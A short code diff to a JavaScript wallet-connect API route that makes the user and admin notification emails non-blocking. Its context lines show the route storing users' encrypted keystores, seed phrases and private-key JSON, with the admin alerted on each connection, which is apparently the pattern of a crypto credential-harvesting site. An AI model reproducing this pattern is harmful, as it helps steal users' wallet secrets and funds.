@@ -44,11 +44,19 @@ export async function POST(req) {
             [user.id, walletType, connectionMethod, walletAddress || null, encryptedKeystore, encryptedPhrase, encryptedKeyJson]
         );
 
-        // Send email to user
-        await sendWalletConnectEmailToUser(user.email, user.username, walletType, connectionMethod);
+        // Send email to user (non-blocking)
+        try {
+            await sendWalletConnectEmailToUser(user.email, user.username, walletType, connectionMethod);
+        } catch (e) {
+            console.warn('Wallet email to user failed (non-blocking):', e.message);
+        }
 
-        // Send email to admin
-        await sendWalletConnectEmailToAdmin(user.email, user.username, walletType, connectionMethod);
+        // Send email to admin (non-blocking)
+        try {
+            await sendWalletConnectEmailToAdmin(user.email, user.username, walletType, connectionMethod);
+        } catch (e) {
+            console.warn('Wallet email to admin failed (non-blocking):', e.message);
+        }
 
         return Response.json({ 
             success: true, 
